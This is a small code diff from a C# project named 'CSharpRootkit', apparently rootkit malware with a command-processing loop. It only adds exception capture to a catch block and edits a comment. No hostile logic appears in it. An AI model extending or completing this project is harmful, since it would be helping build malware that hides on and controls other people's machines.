@@ -130,8 +130,9 @@ namespace CSharpRootkit
                         ProcessMemoryFileUpdates();
                     }
                 }
-                catch
+                catch (Exception e)
                 {
+                    var f = e;
                     errorCount++;
                     if (errorCount >= MaxErrorCount) 
                     {
@@ -188,7 +189,7 @@ namespace CSharpRootkit
                     }
                 }
 
-                //process the commands here.
+                //process the commands here
 
                 Thread.Sleep(1000);
             }
